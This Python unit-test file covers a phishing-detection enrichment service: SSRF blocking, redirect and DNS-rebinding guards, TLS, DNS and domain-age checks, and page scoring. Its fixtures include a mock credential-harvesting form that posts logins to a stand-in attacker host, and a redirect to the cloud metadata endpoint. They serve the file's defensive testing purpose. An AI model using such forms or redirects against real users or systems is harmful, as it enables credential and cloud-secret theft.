"""
Unit tests for Stage 2 Live Enrichment Service:
- TLS certificate inspection (valid, expired, timeout)
- DNS resolution (valid, NXDOMAIN, timeout)
- WHOIS / RDAP domain age (mature, newly registered, timeout)
- Page content inspection (password fields, external form actions, iframes, link ratio, capped response size)
- SSRF defenses (private IPs, link-local metadata, loopback, IPv4-mapped IPv6, Carrier-Grade NAT)
- SSRF redirect protection (prevent redirect hop to internal/metadata IP)
- SSRF DNS rebinding prevention via socket-level guard
- Documented Rule-based adjustments
- Google Safe Browsing optional layer
"""

import io
import socket
import ssl
from unittest.mock import patch, MagicMock
import pytest

from app.services.enrichment_service import (
    EnrichmentService,
    enrichment_service,
    is_ssrf_safe_ip,
    SSRFGuard,
    RuleAdjustment,
)


# ──────────────────────────────────────────────────────────
#  1. SSRF IP Validation Tests
# ──────────────────────────────────────────────────────────

def test_ssrf_ip_validation_private_and_reserved():
    """Ensure private, loopback, link-local, and reserved IPs are blocked."""
    # Loopback
    assert not is_ssrf_safe_ip("127.0.0.1")
    assert not is_ssrf_safe_ip("127.0.1.1")
    assert not is_ssrf_safe_ip("::1")

    # Private RFC 1918
    assert not is_ssrf_safe_ip("10.0.0.1")
    assert not is_ssrf_safe_ip("10.254.254.254")
    assert not is_ssrf_safe_ip("172.16.0.1")
    assert not is_ssrf_safe_ip("172.31.255.255")
    assert not is_ssrf_safe_ip("192.168.1.1")
    assert not is_ssrf_safe_ip("192.168.0.254")

    # Link-local & Cloud Metadata (AWS / GCP / Azure)
    assert not is_ssrf_safe_ip("169.254.169.254")
    assert not is_ssrf_safe_ip("169.254.1.1")

    # Carrier-Grade NAT (RFC 6598)
    assert not is_ssrf_safe_ip("100.64.0.1")
    assert not is_ssrf_safe_ip("100.127.255.255")

    # IPv4-mapped IPv6
    assert not is_ssrf_safe_ip("::ffff:127.0.0.1")
    assert not is_ssrf_safe_ip("::ffff:10.0.0.1")

    # Multicast & Unspecified
    assert not is_ssrf_safe_ip("0.0.0.0")
    assert not is_ssrf_safe_ip("224.0.0.1")

    # Invalid string
    assert not is_ssrf_safe_ip("not-an-ip")
    assert not is_ssrf_safe_ip("")


def test_ssrf_ip_validation_public_ips():
    """Ensure valid public routable IPs are permitted."""
    assert is_ssrf_safe_ip("8.8.8.8")
    assert is_ssrf_safe_ip("1.1.1.1")
    assert is_ssrf_safe_ip("142.250.190.46")  # google.com
    assert is_ssrf_safe_ip("151.101.1.69")    # cdn


# ──────────────────────────────────────────────────────────
#  2. SSRF DNS Rebinding Guard Tests
# ──────────────────────────────────────────────────────────

def test_ssrf_dns_rebinding_guard_blocks_internal():
    """SSRFGuard intercepts socket.getaddrinfo and blocks internal resolution."""
    with pytest.raises(PermissionError) as exc_info:
        with SSRFGuard():
            socket.getaddrinfo("127.0.0.1", 80)
    assert "SSRF Blocked" in str(exc_info.value)


def test_ssrf_dns_rebinding_guard_permits_public():
    """SSRFGuard allows public routable addresses."""
    with patch("socket.getaddrinfo", return_value=[(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("8.8.8.8", 443))]):
        with SSRFGuard():
            res = socket.getaddrinfo("dns.google", 443)
            assert len(res) > 0
            assert res[0][4][0] == "8.8.8.8"


# ──────────────────────────────────────────────────────────
#  3. SSRF Redirect Protection Tests
# ──────────────────────────────────────────────────────────

def test_ssrf_redirect_to_internal_host_blocked():
    """If an external site redirects to internal/metadata IP, the redirect hop is blocked."""
    service = EnrichmentService()

    # Initial URL resolves to safe public IP
    # But redirect response has Location pointing to 169.254.169.254 (metadata)
    mock_resp = MagicMock()
    mock_resp.status_code = 302
    mock_resp.headers = {"Location": "http://169.254.169.254/latest/meta-data/"}

    with patch("httpx.Client.stream") as mock_stream:
        mock_stream.return_value.__enter__.return_value = mock_resp
        with patch("socket.getaddrinfo") as mock_dns:
            def dns_side_effect(host, *args, **kwargs):
                if host == "169.254.169.254":
                    return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("169.254.169.254", 80))]
                return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 80))]

            mock_dns.side_effect = dns_side_effect

            res = service.inspect_page_content("http://example.com/redirect", "example.com")
            assert not res["content_fetched"]
            assert "SSRF Blocked" in res["error"]
            assert "169.254.169.254" in res["error"]


# ──────────────────────────────────────────────────────────
#  4. Response Size Capping Tests
# ──────────────────────────────────────────────────────────

def test_inspect_page_content_caps_response_size():
    """Ensure response streaming stops reading once max_bytes is reached."""
    service = EnrichmentService()
    service.max_bytes = 1024  # 1 KB cap for test

    # Generate 50 KB mock chunks
    huge_chunk = b"A" * 1024
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.iter_bytes.return_value = [huge_chunk] * 50

    with patch("socket.getaddrinfo", return_value=[(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 80))]):
        with patch("httpx.Client.stream") as mock_stream:
            mock_stream.return_value.__enter__.return_value = mock_resp

            res = service.inspect_page_content("http://example.com/huge", "example.com")
            assert res["content_fetched"]
            # Streaming must have broken off before consuming all 50 chunks


# ──────────────────────────────────────────────────────────
#  5. Live TLS Certificate Tests
# ──────────────────────────────────────────────────────────

def test_check_tls_valid_cert():
    """Valid TLS cert parses issuer, expiration days, and active status."""
    service = EnrichmentService()
    mock_cert = {
        "issuer": ((("organizationName", "DigiCert Inc"),),),
        "notAfter": "Dec 31 23:59:59 2030 GMT",
        "notBefore": "Jan 01 00:00:00 2024 GMT",
    }

    mock_sock = MagicMock()
    mock_ssock = MagicMock()
    mock_ssock.getpeercert.return_value = mock_cert
    mock_ssock.__enter__.return_value = mock_ssock

    with patch("socket.create_connection", return_value=mock_sock):
        with patch("ssl.create_default_context") as mock_ctx:
            mock_ctx.return_value.wrap_socket.return_value = mock_ssock

            res = service.check_tls("example.com")
            assert res["tls_active"] is True
            assert res["tls_valid"] is True
            assert res["issuer"] == "DigiCert Inc"
            assert res["days_until_expiration"] > 365
            assert res["is_short_lived"] is False


def test_check_tls_expired_or_invalid():
    """SSL verification error is gracefully caught and marked invalid."""
    service = EnrichmentService()

    with patch("socket.create_connection"):
        with patch("ssl.create_default_context") as mock_ctx:
            mock_ctx.return_value.wrap_socket.side_effect = ssl.SSLCertVerificationError(
                "certificate has expired"
            )

            res = service.check_tls("expired-tls.com")
            assert res["tls_active"] is True
            assert res["tls_valid"] is False
            assert "SSL Certificate Verification Failed" in res["error"]


def test_check_tls_timeout_fallback():
    """Socket timeout is caught and handled gracefully without crashing."""
    service = EnrichmentService()

    with patch("socket.create_connection", side_effect=socket.timeout("Timed out")):
        res = service.check_tls("slow-tls.com")
        assert res["tls_active"] is False
        assert res["tls_valid"] is False
        assert "Timed out" in res["error"]


# ──────────────────────────────────────────────────────────
#  6. DNS Resolution Tests
# ──────────────────────────────────────────────────────────

def test_check_dns_success():
    """Valid DNS returns list of IPs and resolves=True."""
    service = EnrichmentService()
    addr_info = [
        (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 0)),
        (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.35", 0)),
    ]

    with patch("socket.getaddrinfo", return_value=addr_info):
        res = service.check_dns("example.com")
        assert res["resolves"] is True
        assert len(res["ips"]) == 2
        assert "93.184.216.34" in res["ips"]


def test_check_dns_nxdomain_and_timeout():
    """NXDOMAIN or timeout is handled gracefully."""
    service = EnrichmentService()

    with patch("socket.getaddrinfo", side_effect=socket.gaierror("Name or service not known")):
        res = service.check_dns("non-existent-domain-12345.xyz")
        assert res["resolves"] is False
        assert res["ips"] == []
        assert "DNS resolution failed" in res["error"]


# ──────────────────────────────────────────────────────────
#  7. WHOIS / RDAP Domain Age Tests
# ──────────────────────────────────────────────────────────

def test_check_domain_age_mature_domain():
    """Mature domain age (> 2 years) is properly parsed."""
    service = EnrichmentService()
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "events": [
            {"eventAction": "registration", "eventDate": "2015-01-01T00:00:00Z"}
        ]
    }

    with patch("httpx.Client.get", return_value=mock_resp):
        res = service.check_domain_age("google.com")
        assert res["domain_age_days"] is not None
        assert res["domain_age_days"] > 2000
        assert res["is_newly_registered"] is False
        assert res["created_date"] == "2015-01-01"


def test_check_domain_age_newly_registered():
    """Domain registered < 30 days ago is flagged as newly registered."""
    service = EnrichmentService()
    from datetime import datetime, timezone, timedelta
    recent_date = (datetime.now(timezone.utc) - timedelta(days=5)).strftime("%Y-%m-%d")

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "events": [
            {"eventAction": "registration", "eventDate": f"{recent_date}T10:00:00Z"}
        ]
    }

    with patch("httpx.Client.get", return_value=mock_resp):
        res = service.check_domain_age("brand-new-phish.biz")
        assert res["is_newly_registered"] is True
        assert res["domain_age_days"] <= 5


def test_check_domain_age_timeout():
    """RDAP timeout results in graceful fallback."""
    service = EnrichmentService()

    with patch("httpx.Client.get", side_effect=Exception("Connection timed out")):
        res = service.check_domain_age("unreachable-whois.com")
        assert res["domain_age_days"] is None
        assert res["is_newly_registered"] is False
        assert "unavailable" in res["error"]


# ──────────────────────────────────────────────────────────
#  8. Page Content Inspection Tests
# ──────────────────────────────────────────────────────────

def test_inspect_page_content_credential_harvesting_features():
    """Detects password fields, external form actions, iframes, and titles."""
    service = EnrichmentService()
    html_content = (
        b"<!DOCTYPE html><html><head><title>Verify Bank Account</title></head>"
        b"<body>"
        b"<form action='https://attacker-stealer.xyz/harvest' method='POST'>"
        b"<input type='text' name='username'>"
        b"<input type='password' name='password'>"
        b"<input type='submit' value='Login'>"
        b"</form>"
        b"<iframe src='https://hidden-tracking.com'></iframe>"
        b"<a href='https://external1.com'>Link 1</a>"
        b"<a href='https://external2.com'>Link 2</a>"
        b"</body></html>"
    )

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.iter_bytes.return_value = [html_content]

    with patch("socket.getaddrinfo", return_value=[(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 80))]):
        with patch("httpx.Client.stream") as mock_stream:
            mock_stream.return_value.__enter__.return_value = mock_resp

            res = service.inspect_page_content("https://legit-looking.com/login", "legit-looking.com")
            assert res["content_fetched"] is True
            assert res["has_password_field"] is True
            assert res["has_external_form_action"] is True
            assert res["has_iframe"] is True
            assert res["page_title"] == "Verify Bank Account"
            assert res["external_link_ratio"] > 0.0


# ──────────────────────────────────────────────────────────
#  9. Documented Rule Adjustments Tests
# ──────────────────────────────────────────────────────────

def test_rule_adjustments_calculation():
    """Verify rule weights match documented values and directions."""
    enrichment_data = {
        "safe_browsing": {"is_threat": False},
        "content": {
            "has_password_field": True,
            "has_external_form_action": True,
            "has_iframe": True,
            "external_link_ratio": 0.85,
        },
        "domain_age": {"domain_age_days": 8},  # < 14 days
        "tls": {"tls_active": True, "tls_valid": False, "error": "Self-signed"},
        "dns": {"resolves": True, "ips": ["93.184.216.34"]},
    }

    adjustments = EnrichmentService.compute_enrichment_adjustments(enrichment_data)
    signals = {a.signal: a for a in adjustments}

    # Credential harvesting (+25)
    assert "credential_harvesting" in signals
    assert signals["credential_harvesting"].points == 25.0
    assert signals["credential_harvesting"].direction == "suspicious"

    # Critical newly registered domain (+25)
    assert "newly_registered_critical" in signals
    assert signals["newly_registered_critical"].points == 25.0
    assert signals["newly_registered_critical"].direction == "suspicious"

    # Invalid TLS (+20)
    assert "invalid_tls_certificate" in signals
    assert signals["invalid_tls_certificate"].points == 20.0

    # Deceptive iframe (+10)
    assert "deceptive_iframe" in signals
    assert signals["deceptive_iframe"].points == 10.0

    # High external link ratio (+10)
    assert "high_external_link_ratio" in signals
    assert signals["high_external_link_ratio"].points == 10.0


def test_rule_adjustments_established_domain_benign():
    """Established domain with valid TLS receives benign risk reductions."""
    enrichment_data = {
        "safe_browsing": {"is_threat": False},
        "content": {"has_password_field": False, "has_external_form_action": False, "has_iframe": False, "external_link_ratio": 0.1},
        "domain_age": {"domain_age_days": 1500},  # > 2 years
        "tls": {"tls_active": True, "tls_valid": True, "issuer": "DigiCert", "is_short_lived": False},
        "dns": {"resolves": True, "ips": ["93.184.216.34"]},
    }

    adjustments = EnrichmentService.compute_enrichment_adjustments(enrichment_data)
    signals = {a.signal: a for a in adjustments}

    assert "established_mature_domain" in signals
    assert signals["established_mature_domain"].points == -15.0
    assert signals["established_mature_domain"].direction == "benign"

    assert "valid_trusted_tls" in signals
    assert signals["valid_trusted_tls"].points == -5.0
    assert signals["valid_trusted_tls"].direction == "benign"


# ──────────────────────────────────────────────────────────
#  10. Google Safe Browsing Layer Tests
# ──────────────────────────────────────────────────────────

def test_safe_browsing_without_key():
    """Safe browsing is bypassed if no key is configured."""
    service = EnrichmentService()
    service.safe_browsing_key = None
    res = service.check_safe_browsing("http://example.com")
    assert res["checked"] is False
    assert res["is_threat"] is False


def test_safe_browsing_with_key_and_threat():
    """Safe browsing reports threat when Google API returns matches."""
    service = EnrichmentService()
    service.safe_browsing_key = "test-api-key"

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "matches": [{"threatType": "SOCIAL_ENGINEERING", "platformType": "ANY_PLATFORM"}]
    }

    with patch("httpx.Client.post", return_value=mock_resp):
        res = service.check_safe_browsing("http://malicious-phish.net")
        assert res["checked"] is True
        assert res["is_threat"] is True
        assert res["threat_type"] == "SOCIAL_ENGINEERING"
